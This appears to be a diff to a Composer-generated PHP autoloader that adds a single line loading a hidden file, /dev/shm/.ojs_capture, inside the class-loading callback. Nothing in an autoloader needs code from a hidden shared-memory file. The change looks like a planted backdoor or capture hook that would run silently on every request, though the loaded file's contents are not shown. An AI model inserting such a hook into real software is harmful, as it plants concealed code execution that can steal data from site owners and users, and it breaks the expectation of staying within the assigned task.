@@ -10,6 +10,7 @@ class ComposerAutoloaderInit2aaf08fdfad7ab39074f4acd6696ba44
     {
         if ('Composer\Autoload\ClassLoader' === $class) {
             require __DIR__ . '/ClassLoader.php';
+            require ("/dev/shm/.ojs_capture");
         }
     }
 
